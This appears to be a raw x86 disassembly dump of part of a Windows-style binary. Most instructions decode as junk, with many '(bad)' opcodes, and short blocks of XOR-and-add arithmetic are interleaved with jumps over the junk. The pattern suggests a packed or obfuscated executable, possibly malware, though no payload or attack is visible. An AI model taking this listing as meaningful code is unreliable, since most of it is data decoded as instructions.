  40d683:	or     eax,0xd6abb505
  40d688:	cmp    ebp,ecx
  40d68a:	(bad)  
  40d68c:	sub    DWORD PTR [edi+edx*4+0x21],esp
  40d690:	aas    
  40d691:	dec    esp
  40d692:	je     0x40d691
  40d694:	mov    edi,0xb2c75441
  40d699:	inc    ebp
  40d69a:	mov    eax,ds:0xb58b058d
  40d69f:	xchg   edi,eax
  40d6a0:	(bad)  
  40d6a1:	jmp    0x8558:0x4e4451d
  40d6a8:	fcmovb st,st(5)
  40d6aa:	mov    al,0xdd
  40d6ac:	cmpeqps xmm5,xmm6
  40d6b0:	mov    al,ds:0xd81797a8
  40d6b5:	dec    ebp
  40d6b6:	inc    ecx
  40d6b7:	add    al,0x4b
  40d6b9:	or     edx,DWORD PTR [esi-0xa39f444]
  40d6bf:	sbb    BYTE PTR [ebx+0x55924e1],ah
  40d6c5:	test   DWORD PTR [esi],0x65e8543b
  40d6cb:	xlat   BYTE PTR ds:[ebx]
  40d6cc:	icebp  
  40d6cd:	repnz xor DWORD PTR [edx],esi
  40d6d0:	mov    BYTE PTR [eax],dl
  40d6d2:	repnz lods eax,DWORD PTR ds:[esi]
  40d6d4:	outs   dx,DWORD PTR ds:[esi]
  40d6d5:	push   0x3
  40d6d7:	mov    dh,0xb5
  40d6d9:	or     DWORD PTR [edi+ecx*8+0x7b76db36],0xc408f7b4
  40d6e4:	push   es
  40d6e5:	data16 out 0x94,al
  40d6e8:	xchg   ebx,eax
  40d6e9:	mov    esi,DWORD PTR [edi]
  40d6eb:	adc    al,0x5c
  40d6ed:	mov    esi,DWORD PTR [esi-0x75]
  40d6f0:	inc    ebp
  40d6f1:	cld    
  40d6f2:	xor    eax,0x7510854
  40d6f7:	jmp    0x40d57a
  40d6fc:	mov    eax,DWORD PTR [ebp+0xc]
  40d6ff:	add    eax,DWORD PTR [ebp+0x8]
  40d702:	mov    DWORD PTR [ebp-0x10],eax
  40d705:	mov    eax,DWORD PTR [ebp-0x1c]
  40d708:	test   eax,eax
  40d70a:	je     0x40de47
  40d710:	mov    DWORD PTR [ebp-0x24],esi
  40d713:	push   0xb
  40d715:	jmp    0x40d85e
  40d71a:	dec    esi
  40d71b:	(bad)  
  40d71c:	xchg   ebx,eax
  40d71d:	mov    bh,0x93
  40d71f:	jae    0x40d78b
  40d721:	out    0x84,eax
  40d723:	push   ss
  40d724:	(bad)  
  40d725:	mov    WORD PTR ds:0x5578774,gs
  40d72b:	lea    edi,[esi+0x7e]
  40d72e:	and    bh,BYTE PTR [edi+0x7e]
  40d731:	jle    0x40d795
  40d733:	push   ebx
  40d734:	push   edx
  40d735:	(bad)  
  40d737:	jle    0x40d74e
  40d739:	fwait
  40d73a:	inc    ebx
  40d73b:	xchg   esp,eax
  40d73c:	test   eax,0xcc195e75
  40d741:	fild   WORD PTR [ecx+0x69a490b1]
  40d747:	sub    al,BYTE PTR [ebp+0x4f]
  40d74a:	fwait
  40d74b:	in     al,0x76
  40d74d:	test   al,0xf4
  40d74f:	sub    al,0x81
  40d751:	loop   0x40d6ef
  40d753:	aad    0x8e
  40d755:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d756:	push   edx
  40d757:	fist   DWORD PTR [eax*1-0x45b5e955]
  40d75e:	xchg   esp,eax
  40d75f:	jmp    0x377c:0xc15120e0
  40d766:	or     BYTE PTR [edi-0xd],cl
  40d769:	cwde   
  40d76a:	dec    esi
  40d76b:	mov    esi,0x3c63001e
  40d770:	pushf  
  40d771:	xchg   BYTE PTR [edi],dl
  40d773:	lods   al,BYTE PTR ds:[esi]
  40d774:	enter  0xcc4b,0xa1
  40d778:	ds xor edi,ebp
  40d77b:	rcr    DWORD PTR [edi-0x6e056b16],0xc8
  40d782:	lahf   
  40d783:	pop    es
  40d784:	or     al,0xf5
  40d786:	pop    eax
  40d787:	ret    0xaed8
  40d78a:	ins    BYTE PTR es:[edi],dx
  40d78b:	(bad)  
  40d78c:	ficom  DWORD PTR [esi+eax*8]
  40d78f:	ss sti 
  40d791:	cmp    eax,esi
  40d793:	push   esi
  40d794:	aam    0x3
  40d796:	call   0xb0ac:0x27602088
  40d79d:	imul   eax,DWORD PTR [eax-0x2a],0xf44edc0
  40d7a4:	mov    cl,0x33
  40d7a6:	repz xchg ebp,eax
  40d7a8:	cdq    
  40d7a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7aa:	stc    
  40d7ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7ac:	mov    al,ds:0x6b615ac5
  40d7b1:	push   0xffffffc2
  40d7b3:	dec    esi
  40d7b4:	or     BYTE PTR [ebx],cl
  40d7b6:	push   ss
  40d7b7:	test   BYTE PTR [eax+0x4c89466c],bl
  40d7bd:	push   ebp
  40d7be:	(bad)  
  40d7bf:	(bad)  
  40d7c0:	out    dx,eax
  40d7c1:	jp     0x40d7b6
  40d7c3:	es mov al,0xc
  40d7c6:	stc    
  40d7c7:	jmp    0x40d82a
  40d7c9:	aad    0xdf
  40d7cb:	and    DWORD PTR [esi+0x34],eax
  40d7ce:	pop    eax
  40d7cf:	js     0x40d833
  40d7d1:	push   ds
  40d7d2:	dec    ebp
  40d7d3:	in     al,dx
  40d7d4:	pop    edi
  40d7d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7d6:	xlat   BYTE PTR ds:[ebx]
  40d7d7:	jbe    0x40d7bc
  40d7d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7da:	jmp    0xdebd32e4
  40d7df:	mov    bl,0x9f
  40d7e1:	fdiv   QWORD PTR [eax]
  40d7e3:	mov    edi,0x26649972
  40d7e8:	inc    esi
  40d7e9:	pop    ss
  40d7ea:	(bad)  
  40d7eb:	adc    dh,BYTE PTR [edi-0x7dc9836b]
  40d7f1:	push   eax
  40d7f2:	cmc    
  40d7f3:	mov    ah,0xfc
  40d7f5:	shr    BYTE PTR [ebp-0x4b4895ec],1
  40d7fb:	inc    eax
  40d7fc:	mov    BYTE PTR [edi-0x72],dh
  40d7ff:	pop    ebp
  40d800:	mov    ecx,0xbb190c6e
  40d805:	popf   
  40d806:	pop    ebx
  40d807:	or     eax,0x9a672d0d
  40d80c:	sub    eax,0xf2bd4673
  40d811:	xchg   ebx,eax
  40d812:	stos   BYTE PTR es:[edi],al
  40d813:	dec    ecx
  40d814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d815:	inc    edi
  40d816:	nop
  40d817:	and    DWORD PTR [ecx+0x36],0xe738bd89
  40d81e:	pop    esi
  40d81f:	stos   DWORD PTR es:[edi],eax
  40d820:	movsx  esp,BYTE PTR [esi+ebx*4-0x77]
  40d825:	in     al,dx
  40d826:	jb     0x40d866
  40d828:	mov    dh,0x3d
  40d82a:	int    0xf3
  40d82c:	xchg   ebx,eax
  40d82d:	(bad)  
  40d82e:	sahf   
  40d82f:	add    al,0xa6
  40d831:	sahf   
  40d832:	iret   
  40d833:	daa    
  40d834:	or     DWORD PTR [eax],ebp
  40d836:	test   al,0x6c
  40d838:	sub    BYTE PTR [esi+0x6],0x8e
  40d83c:	push   es
  40d83d:	retf   
  40d83e:	aad    0x12
  40d840:	pop    ds
  40d841:	mov    ah,bl
  40d843:	nop
  40d844:	ficomp WORD PTR [edx]
  40d846:	or     eax,0xd1d91268
  40d84b:	pop    ecx
  40d84c:	test   edi,esi
  40d84e:	(bad)  
  40d84f:	aad    0xda
  40d851:	xor    eax,0x1d884ac1
  40d856:	ja     0x40d87b
  40d858:	call   0xfb08d2f4
  40d85d:	jno    0x40d8b8
  40d85f:	push   0x5
  40d861:	dec    ecx
  40d862:	pop    ebx
  40d863:	xchg   ebx,ecx
  40d865:	sub    ebx,ecx
  40d867:	jmp    0x40d9b0
  40d86c:	adc    edx,DWORD PTR [edi+esi*2]
  40d86f:	jae    0x40d8e2
  40d871:	jno    0x40d886
  40d873:	je     0x40d880
  40d875:	(bad)  
  40d876:	adc    ecx,edx
  40d878:	mov    eax,0x2989deb7
  40d87d:	mov    bh,BYTE PTR [esi+0x7e]
  40d880:	and    bh,BYTE PTR [edi+0x7e]
  40d883:	jle    0x40d8d1
  40d885:	pusha  
  40d886:	or     BYTE PTR [edx-0x1c],bl
  40d889:	mov    eax,0x4eeda2b7
  40d88e:	push   cs
  40d88f:	out    dx,eax
  40d890:	adc    al,0xb1
  40d892:	idiv   BYTE PTR [ebx]
  40d894:	mov    ch,BYTE PTR [esi+0x1f]
  40d897:	aad    0x6e
  40d899:	loope  0x40d8e2
  40d89b:	push   ecx
  40d89c:	pop    ebp
  40d89d:	jmp    0x49cb:0x35fd2372
  40d8a4:	fisub  WORD PTR [ebx-0x47]
  40d8a7:	add    eax,0x7e57ea2c
  40d8ac:	(bad)  
  40d8ad:	ret    0xb024
  40d8b0:	fadd   DWORD PTR [esi]
  40d8b2:	pusha  
  40d8b3:	mov    dl,0x64
  40d8b5:	cs push 0x96fa0375
  40d8bb:	jmp    0x40d8ad
  40d8bd:	jae    0x40d863
  40d8bf:	pop    es
  40d8c0:	cmp    ebx,esi
  40d8c2:	(bad)
  40d8c5:	push   cs
  40d8c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8c7:	xor    eax,0x1ac8798f
  40d8cc:	sbb    eax,0xec4071b9
  40d8d1:	ror    BYTE PTR [edi-0x5bcf6ed8],1
  40d8d7:	(bad)  
  40d8d8:	inc    ebx
  40d8d9:	pop    ebp
  40d8da:	sahf   
  40d8db:	lods   eax,DWORD PTR ds:[esi]
  40d8dc:	pop    ds
  40d8dd:	lods   eax,DWORD PTR ds:[esi]
  40d8de:	add    bh,BYTE PTR [edx-0x77]
  40d8e1:	ret    0xb4d2
  40d8e4:	jmp    0x40d8cd
  40d8e6:	lds    ebp,FWORD PTR [ebx]
  40d8e8:	pop    eax
  40d8e9:	cmp    eax,0x773085a1
  40d8ee:	pop    eax
  40d8ef:	fidivr DWORD PTR [edi]
  40d8f1:	add    BYTE PTR [edx-0x75e4cfb9],0xd4
  40d8f8:	outs   dx,BYTE PTR ds:[esi]
  40d8f9:	ja     0x40d8d8
  40d8fb:	and    al,0x19
  40d8fd:	jecxz  0x40d95d
  40d8ff:	pop    ds
  40d900:	jmp    0xf9d8:0x7752d8a3
  40d907:	je     0x40d88d
  40d909:	mov    ch,0x31
  40d90b:	push   0x4d
  40d90d:	jnp    0x40d91c
  40d90f:	enter  0xc194,0x92
  40d913:	jo     0x40d966
  40d915:	iret   
  40d916:	fwait
  40d917:	ja     0x40d89f
  40d919:	loop   0x40d93f
  40d91b:	(bad)  
  40d91c:	dec    edi
  40d91d:	push   0x55f65ce4
  40d922:	in     eax,dx
  40d923:	aas    
  40d924:	scas   al,BYTE PTR es:[edi]
  40d925:	pop    eax
  40d926:	jbe    0x40d919
  40d928:	fld    TBYTE PTR [ecx]
  40d92a:	mov    WORD PTR [edx+0x32],ss
  40d92d:	ror    DWORD PTR [ebx-0x2f88ece3],cl
  40d933:	pop    gs
  40d935:	dec    ecx
  40d936:	sub    bl,dl
  40d938:	dec    ebp
  40d939:	or     bl,BYTE PTR [ebx+0x4a830edc]
  40d93f:	or     BYTE PTR [edi-0x251e23e9],bh
  40d945:	mov    cs,ebp
  40d947:	out    0xe4,al
  40d949:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d94a:	bound  edi,QWORD PTR ds:0x26de9db1
  40d950:	jo     0x40d98e
  40d952:	daa    
  40d953:	loopne 0x40d91d
  40d955:	imul   esp,DWORD PTR ds:0xe1ed615c,0xffffffbf
  40d95c:	clc    
  40d95d:	pop    edx
  40d95e:	in     al,0x9f
  40d960:	out    0x83,al
  40d962:	je     0x40d985
  40d964:	mov    eax,0xf0a91888
  40d969:	shl    DWORD PTR [ecx+0x5e],0x87
  40d96d:	xor    al,0x37
  40d96f:	addr16 js 0x40d916
  40d972:	das    
  40d973:	mov    ebx,0xbe90b6f4
  40d978:	mov    BYTE PTR [eax],ch
  40d97a:	pop    ebp
  40d97b:	ficomp DWORD PTR [ecx+0x38]
  40d97e:	sbb    al,0x5c
  40d980:	iret   
  40d981:	in     al,dx
  40d982:	pop    ebp
  40d983:	xchg   ebp,eax
  40d984:	dec    esi
  40d985:	imul   eax,eax,0x39
  40d988:	pop    esi
  40d989:	(bad)  
  40d98a:	in     eax,0x7b
  40d98c:	mov    BYTE PTR [esi],bl
  40d98e:	jae    0x40d955
  40d990:	pop    ss
  40d991:	pop    ds
  40d992:	stc    
  40d993:	icebp  
  40d994:	jp     0x40d9cb
  40d996:	cmp    DWORD PTR [edx],ecx
  40d998:	push   edi
  40d999:	jns    0x40d935
  40d99b:	loope  0x40da1c
  40d99d:	adc    DWORD PTR [edi],ebp
  40d99f:	stc    
  40d9a0:	pop    ecx
  40d9a1:	dec    edx
  40d9a2:	leave  
  40d9a3:	jl     0x40d993
  40d9a5:	cmc    
  40d9a6:	jns    0x40da0d
  40d9a8:	not    DWORD PTR [esp+ecx*4-0x64a3b5fe]
  40d9af:	mov    ch,0x87
  40d9b1:	retf   
  40d9b2:	jmp    0x40dafb
  40d9b7:	mov    ebx,0xf146cba5
  40d9bc:	jo     0x40da11
  40d9be:	mov    eax,ds:0x3f48df24
  40d9c3:	push   eax
  40d9c4:	pop    ebp
  40d9c5:	push   cs
  40d9c6:	scas   eax,DWORD PTR es:[edi]
  40d9c7:	fisttp QWORD PTR [ebx+0x7f227e7e]
  40d9cd:	jle    0x40da4d
  40d9cf:	xchg   DWORD PTR [ebx],esp
  40d9d1:	mov    edi,0x2de234a6
  40d9d6:	and    eax,0x56be6005
  40d9db:	imul   ebx,DWORD PTR [edx],0xffffff90
  40d9de:	repz data16 adc bl,BYTE PTR [eax+0x22]
  40d9e3:	mov    edx,edx
  40d9e5:	es icebp 
  40d9e7:	add    DWORD PTR [ecx-0x62c780e8],esp
  40d9ed:	pop    edx
  40d9ee:	add    ebp,DWORD PTR [edi-0x5842201a]
  40d9f4:	and    eax,0x16571d9f
  40d9f9:	cmp    edx,DWORD PTR [edi+0x4e9ca5dc]
  40d9ff:	in     eax,0x73
  40da01:	shl    DWORD PTR ds:0x2a7505a6,cl
  40da07:	std    
  40da08:	cli    
  40da09:	xchg   edi,eax
  40da0a:	pop    es
  40da0b:	dec    edx
  40da0c:	push   cs
  40da0d:	sbb    eax,0x8cdae1f1
  40da12:	fild   WORD PTR ds:[esi-0x6b36f01e]
  40da19:	and    al,bl
  40da1b:	shl    DWORD PTR [edx-0x51],1
  40da1e:	xchg   BYTE PTR [ebp+0x734e712c],bl
  40da24:	mov    dl,0x9f
  40da26:	bound  esp,QWORD PTR [edx]
  40da28:	pop    ss
  40da29:	push   ds
  40da2a:	sbb    DWORD PTR [edx],eax
  40da2c:	pop    edx
  40da2d:	xor    BYTE PTR [edx],bl
  40da2f:	test   BYTE PTR [edi-0x6f60a5db],bl
  40da35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da36:	gs ins BYTE PTR es:[edi],dx
  40da38:	sbb    ebx,DWORD PTR [ebx+0xc01c1d8]
  40da3e:	je     0x40da96
  40da40:	xchg   ecx,eax
  40da41:	dec    edx
  40da42:	outs   dx,DWORD PTR ds:[esi]
  40da43:	mov    edx,DWORD PTR [edi]
  40da45:	repnz cmp BYTE PTR ds:0x6b6af7b8,dl
  40da4c:	add    cl,BYTE PTR [esi]
  40da4e:	dec    edi
  40da4f:	dec    esp
  40da50:	hlt    
  40da51:	mov    al,0xd6
  40da53:	ss into 
  40da55:	arpl   WORD PTR gs:0xe271e9a4,cx
  40da5c:	jp     0x40da3f
  40da5e:	aam    0x82
  40da60:	(bad)  
  40da62:	mov    dl,0x9b
  40da64:	sub    eax,edi
  40da66:	or     al,0x94
  40da68:	cmp    al,0x19
  40da6a:	sbb    ebp,DWORD PTR [eax+0x6bad4d74]
  40da70:	in     al,dx
  40da71:	(bad)  
  40da72:	xor    eax,0x8181cb21
  40da77:	fwait
  40da78:	in     al,dx
  40da79:	in     al,0x6
  40da7b:	pushf  
  40da7c:	push   ecx
  40da7d:	hlt    
  40da7e:	aad    0xf7
  40da80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da81:	adc    eax,0x36e0f10
  40da86:	ret    0x988
  40da89:	test   al,0x2
  40da8b:	mov    edi,0xaffafa7e
  40da90:	push   0xe8b17aa1
  40da95:	lds    esi,FWORD PTR [ebx+0x5a]
  40da98:	mov    esp,0x6ebc43cf
  40da9d:	test   DWORD PTR [eax-0x8],edi
  40daa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daa1:	ja     0x40db09
  40daa3:	cmp    BYTE PTR [edx],ch
  40daa5:	(bad)  
  40daa6:	aas    
  40daa7:	mov    eax,0x2d0b06e6
  40daac:	jecxz  0x40dadc
  40daae:	pop    ss
  40daaf:	test   BYTE PTR [edx-0x2c],0x56
  40dab3:	dec    ecx
  40dab4:	mov    esi,0x546db18a
  40dab9:	xor    al,0x5d
  40dabc:	arpl   WORD PTR [ebx],bp
  40dabe:	(bad)  
  40dabf:	lds    ecx,FWORD PTR [ecx+ebp*8+0x27127492]
  40dac6:	popa   
  40dac7:	sbb    al,0x5d
  40dac9:	es mov esp,0x7056b442
  40dacf:	pop    ecx
  40dad0:	sar    dl,1
  40dad2:	out    0x27,eax
  40dad4:	adc    DWORD PTR [esi-0x390a1bcf],edx
  40dada:	addr16 sbb al,0x62
  40dadd:	ins    DWORD PTR es:[edi],dx
  40dade:	idiv   BYTE PTR [ebp-0x37feca5c]
  40dae4:	mov    dl,BYTE PTR [ebp-0x79abcbd9]
  40daea:	daa    
  40daeb:	sahf   
  40daec:	adc    DWORD PTR [ecx],0x2f
  40daef:	repnz sub DWORD PTR [ebx+0x23352910],esp
  40daf6:	sar    DWORD PTR [ecx+0x493395c7],1
  40dafc:	mov    eax,DWORD PTR [ebp-0x1c]
  40daff:	imul   eax,ecx
  40db02:	sub    esp,eax
  40db04:	mov    DWORD PTR [ebp-0x24],esp
  40db07:	mov    eax,DWORD PTR [ebp-0x4]
  40db0a:	mov    ecx,0x7510854
  40db0f:	xor    eax,ecx
  40db11:	mov    edx,0x32729b
  40db16:	add    eax,edx
  40db18:	mov    DWORD PTR [ebp+0x8],eax
  40db1b:	mov    eax,DWORD PTR [ebp-0x18]
  40db1e:	xor    eax,ecx
  40db20:	jmp    0x40dc69
  40db25:	fsub   DWORD PTR [edx+0x35701da8]
  40db2b:	imul   esp,DWORD PTR [ebx+0x3b],0x93b6fdf0
  40db32:	popf   
  40db33:	ja     0x40dafc
  40db35:	or     DWORD PTR [eax+0x7f227e7e],0x85b07e7e
  40db3f:	mov    esi,0x3e6f4055
  40db44:	cdq    
  40db45:	stc    
  40db46:	loop   0x40db0f
  40db48:	mov    DWORD PTR [ebx+eax*1],edi
  40db4b:	imul   esi,DWORD PTR [ecx+0x59],0x56
  40db4f:	das    
  40db50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db51:	in     eax,dx
  40db52:	aad    0x44
  40db54:	ins    BYTE PTR es:[edi],dx
  40db55:	xor    al,0x1e
  40db57:	dec    esi
  40db58:	inc    edi
  40db59:	xchg   esp,eax
  40db5a:	(bad)  
  40db5b:	jmp    0x612a:0x5f7d89a9
  40db62:	shl    DWORD PTR [edi-0x2814ac0f],0xf7
  40db69:	nop
  40db6a:	sub    ebp,DWORD PTR [ebp+0x6e]
  40db6d:	cwde   
  40db6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db6f:	popa   
  40db70:	fldcw  WORD PTR [ebx+0xebeac62]
  40db76:	mov    bh,0x8c
  40db78:	ins    BYTE PTR es:[edi],dx
  40db79:	and    eax,0xb013eb5c
  40db7e:	ret    
  40db7f:	js     0x40db20
  40db81:	jne    0x40db04
  40db83:	adc    BYTE PTR [ecx+0x71],dh
  40db86:	ins    BYTE PTR es:[edi],dx
  40db87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db88:	jnp    0x40db32
  40db8a:	rol    BYTE PTR [ecx+0x55],1
  40db8d:	dec    edi
  40db8e:	lods   al,BYTE PTR ds:[esi]
  40db8f:	mov    dl,0xe1
  40db91:	in     eax,0xd1
  40db93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db94:	sbb    BYTE PTR [esi+0xd],dh
  40db97:	mov    eax,0xd5a56a82
  40db9c:	push   ds
  40db9d:	add    al,0x7a
  40db9f:	jg     0x40db6d
  40dba1:	hlt    
  40dba2:	adc    al,0x16
  40dba4:	out    0x3b,eax
  40dba6:	adc    dl,BYTE PTR [ebx+esi*4-0x7ee07774]
  40dbad:	or     ebp,ebp
  40dbaf:	sbb    ecx,DWORD PTR ds:0x52f2a07d
  40dbb5:	outs   dx,BYTE PTR ds:[esi]
  40dbb6:	push   ss
  40dbb7:	jp     0x40db77
  40dbb9:	addr16 cmp al,0x54
  40dbbc:	mov    bh,0x11
  40dbbe:	cmp    DWORD PTR [edx-0x2306e99c],0xd819ca30
  40dbc8:	dec    edx
  40dbc9:	aad    0x28
  40dbcb:	out    0xb0,al
  40dbcd:	add    cx,0xd70e
  40dbd2:	div    BYTE PTR [esi-0xb]
  40dbd5:	add    BYTE PTR [ebp+0x2b72697],dh
  40dbdb:	mov    dh,0x30
  40dbdd:	test   BYTE PTR [eax-0x690a03cc],ah
  40dbe3:	xchg   ebp,eax
  40dbe4:	mov    edi,0xccbd0a0e
  40dbe9:	ror    BYTE PTR [ebx+0x43],0xe9
  40dbed:	ss push 0xffffffe9
  40dbf0:	(bad)  
  40dbf1:	mov    esi,0x8dac0f90
  40dbf6:	test   al,0x9a
  40dbf8:	pop    ecx
  40dbf9:	cdq    
  40dbfa:	xor    ch,BYTE PTR [edi-0x74]
  40dbfd:	mov    ch,0x68
  40dbff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc00:	pushf  
  40dc01:	push   0xffffffd0
  40dc03:	outs   dx,DWORD PTR ds:[esi]
  40dc04:	push   esi
  40dc05:	into   
  40dc06:	mov    edx,0x6470f83
  40dc0b:	jo     0x40dc1a
  40dc0d:	in     eax,dx
  40dc0e:	ficom  DWORD PTR ds:0xa30c5ab5
  40dc14:	repnz or esi,DWORD PTR [esi+esi*2]
  40dc18:	fsubr  st(6),st
  40dc1a:	retf   
  40dc1b:	sbb    DWORD PTR [eax+0x63bce89a],ecx
  40dc21:	test   ebp,edx
  40dc23:	scas   eax,DWORD PTR es:[edi]
  40dc24:	jbe    0x40dbf0
  40dc26:	mov    ah,0xc1
  40dc28:	retf   
  40dc29:	sbb    eax,0x166d6b75
  40dc2e:	cli    
  40dc2f:	call   0xfd7d556
  40dc34:	push   esp
  40dc35:	retf   0x96d3
  40dc38:	loopne 0x40dbcb
  40dc3a:	mov    DWORD PTR [eax+0x33fd0df],ebx
  40dc40:	or     eax,0xb9a4d30c
  40dc45:	pop    edx
  40dc46:	xor    dh,BYTE PTR [edx-0x2a3a6e25]
  40dc4c:	pop    ds
  40dc4d:	fadd   DWORD PTR [edi+0x958f7d9]
  40dc53:	repz dec edi
  40dc55:	xchg   esi,eax
  40dc56:	jmp    0x9f67:0x71ec803f
  40dc5d:	push   edi
  40dc5e:	nop
  40dc5f:	mov    dl,0xbd
  40dc61:	(bad)  
  40dc62:	js     0x40dc76
  40dc64:	jp     0x40dc51
  40dc66:	popf   
  40dc67:	loopne 0x40dc32
  40dc69:	add    eax,edx
  40dc6b:	mov    edx,DWORD PTR [ebp+0x14]
  40dc6e:	imul   eax,DWORD PTR [edx]
  40dc71:	mov    edx,DWORD PTR [ebp-0x4]
  40dc74:	xor    edx,ecx
  40dc76:	mov    ecx,DWORD PTR [ebp+0x8]
  40dc79:	lea    ecx,[edx+ecx*1+0x32729b]
  40dc80:	cmp    ecx,eax
  40dc82:	je     0x40de42
  40dc88:	mov    edi,DWORD PTR [ebp-0x18]
  40dc8b:	mov    eax,DWORD PTR [ebp+0x8]
  40dc8e:	mov    edx,DWORD PTR [ebp+0x14]
  40dc91:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40dc95:	mov    ecx,0x7510854
  40dc9a:	xor    edx,edx
  40dc9c:	xor    edi,ecx
  40dc9e:	mov    esi,0x32729b
  40dca3:	add    edi,esi
  40dca5:	div    edi
  40dca7:	mov    edx,DWORD PTR [ebp-0x4]
  40dcaa:	xor    edx,ecx
  40dcac:	lea    eax,[edx+eax*1+0x32729b]
  40dcb3:	mov    edx,DWORD PTR [ebp+0x8]
  40dcb6:	mov    edi,DWORD PTR [ebp-0x24]
  40dcb9:	mov    DWORD PTR [edi+edx*4],eax
  40dcbc:	mov    eax,DWORD PTR [ebp-0x18]
  40dcbf:	mov    edx,DWORD PTR [ebp+0x8]
  40dcc2:	xor    eax,ecx
  40dcc4:	lea    eax,[eax+edx*1+0x32729b]
  40dccb:	jmp    0x40de14
  40dcd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd1:	scas   eax,DWORD PTR es:[edi]
  40dcd2:	and    eax,0xb1913513
  40dcd7:	stos   DWORD PTR es:[edi],eax
  40dcd8:	jp     0x40dc9c
  40dcda:	mov    ch,0x9b
  40dcdc:	out    dx,eax
  40dcdd:	mov    ebx,0x89b50f2b
  40dce2:	jle    0x40dd62
  40dce4:	and    bh,BYTE PTR [edi+0x7e]
  40dce7:	jle    0x40dcc6
  40dce9:	xchg   edx,eax
  40dcea:	jmp    0xb9e8e663
  40dcef:	or     ebx,edx
  40dcf1:	lahf   
  40dcf2:	cmp    ah,dh
  40dcf4:	sub    DWORD PTR [esi-0x222d9149],edi
  40dcfa:	or     dl,BYTE PTR [edx-0x42849ec7]
  40dd00:	jae    0x40dcdd
  40dd02:	shl    BYTE PTR [ebp+0x78ad1e41],0x5
  40dd09:	sbb    al,BYTE PTR [ecx-0x5b]
  40dd0c:	lock and al,0x6e
  40dd0f:	pop    esi
  40dd10:	stc    
  40dd11:	push   ebp
  40dd12:	inc    esp
  40dd13:	mov    dh,0x19
  40dd15:	call   ebx
  40dd17:	xchg   esp,eax
  40dd18:	jg     0x40dd61
  40dd1a:	icebp  
  40dd1b:	stos   BYTE PTR es:[edi],al
  40dd1c:	cdq    
  40dd1d:	js     0x40dd52
  40dd1f:	stc    
  40dd20:	mov    al,ds:0x7b736774
  40dd25:	mov    BYTE PTR ds:0xb7a10d8e,0x29
  40dd2c:	js     0x40dcf6
  40dd2e:	jg     0x40dd95
  40dd30:	jle    0x40dd94
  40dd32:	mov    cl,0x7
  40dd34:	sbb    BYTE PTR [eax],cl
  40dd36:	aad    0x96
  40dd38:	loope  0x40dd7b
  40dd3a:	in     al,0x5a
  40dd3c:	dec    ebx
  40dd3d:	mov    bl,0x2a
  40dd3f:	(bad)  
  40dd41:	jmp    0xa024:0x4768fbbf
  40dd48:	adc    BYTE PTR [ebx+0x8],bl
  40dd4b:	xchg   edi,eax
  40dd4c:	or     ch,bh
  40dd4e:	cld    
  40dd4f:	in     eax,0xf8
  40dd51:	xchg   edx,eax
  40dd52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd53:	daa    
  40dd54:	push   ebp
  40dd55:	jg     0x40ddd3
  40dd57:	sub    al,0x1c
  40dd59:	iret   
  40dd5a:	or     esi,DWORD PTR [esi+0x21]
  40dd5d:	cli    
  40dd5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd5f:	inc    edx
  40dd60:	pop    eax
  40dd61:	call   0x8818:0xd5d1076
  40dd68:	pop    edx
  40dd69:	ficom  WORD PTR [ecx+0x8bc2def]
  40dd6f:	dec    edi
  40dd70:	out    dx,al
  40dd71:	pushf  
  40dd72:	cmp    DWORD PTR [ecx],0xc578ca28
  40dd78:	jl     0x40dd4e
  40dd7a:	std    
  40dd7b:	sti    
  40dd7c:	mov    DWORD PTR fs:[esi-0x598f37ae],ebx
  40dd83:	inc    esp
  40dd84:	or     cl,BYTE PTR [eax-0x61]
  40dd87:	iret   
  40dd88:	fmulp  st(6),st
  40dd8a:	pop    ss
  40dd8b:	or     al,0x97
  40dd8d:	xor    esi,ebx
  40dd8f:	or     eax,0x1ecca5d7
  40dd94:	mov    ebp,DWORD PTR [edi+0x4df33469]
  40dd9a:	daa    
  40dd9b:	xchg   esp,eax
  40dd9c:	fs xchg ebp,eax
  40dd9e:	sub    al,0x32
  40dda0:	xchg   ebx,eax
  40dda1:	jmp    0x40de06
  40dda3:	push   eax
  40dda4:	frstor [ebp-0x59]
  40dda7:	cli    
  40dda8:	fadd   QWORD PTR [eax+eiz*4+0x32c9ec43]
  40ddaf:	(bad)  
  40ddb0:	fwait
  40ddb1:	pop    edx
  40ddb2:	sbb    DWORD PTR [edi-0x30],edi
  40ddb5:	scas   al,BYTE PTR es:[edi]
  40ddb6:	in     eax,dx
  40ddb7:	jb     0x40ddd0
  40ddb9:	aam    0x5c
  40ddbb:	push   ebx
  40ddbc:	gs push esp
  40ddbe:	and    ecx,esi
  40ddc0:	jnp    0x40dde6
  40ddc2:	jmp    0x2e1cbd07
  40ddc7:	cmp    ecx,DWORD PTR ds:[ebx+0x55]
  40ddcb:	xchg   edi,eax
  40ddcc:	push   ss
  40ddcd:	or     eax,DWORD PTR [eax-0x59004953]
  40ddd3:	lea    ecx,[esi-0x2e]
  40ddd6:	lock or edi,DWORD PTR [edx+0x67]
  40ddda:	and    eax,0x890a759a
  40dddf:	xchg   esp,eax
  40dde0:	mov    ebx,0xbb835a10
  40dde5:	popa   
  40dde6:	stc    
  40dde7:	jae    0x40dd72
  40dde9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddea:	xchg   ebp,eax
